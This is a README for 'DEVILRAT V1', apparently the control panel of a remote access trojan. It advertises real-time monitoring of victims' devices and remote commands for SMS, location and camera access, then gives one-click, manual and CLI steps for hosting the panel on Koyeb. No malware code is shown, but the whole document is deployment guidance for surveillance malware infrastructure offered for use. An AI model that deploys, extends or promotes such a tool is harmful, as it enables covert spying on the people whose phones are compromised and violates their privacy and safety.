# 👹 DEVILRAT V1 - Koyeb Deployment

## Features
- 📱 Real-time device monitoring via WebSocket
- ⚡ Send commands (SMS, Location, Camera, etc.)
- 📊 Device statistics and logs
- 🌙 Devil theme (red/black)
- 📱 Mobile-optimized interface
- 🔒 SQLite database for persistence

## Deploy on Koyeb

### Method 1: One-Click Deploy
[![Deploy to Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy?type=git&repository=yourusername/devilrat-koyeb)

### Method 2: Manual Deployment
1. **Create Koyeb account** at [koyeb.com](https://koyeb.com)
2. **Create new service**
3. **Connect GitHub repository**
4. **Deploy** - Koyeb auto detects `koyeb.yaml`

### Method 3: CLI Deployment
```bash
koyeb service create devilrat \
  --git yourusername/devilrat-koyeb \
  --ports 3000:http \
  --routes /:3000
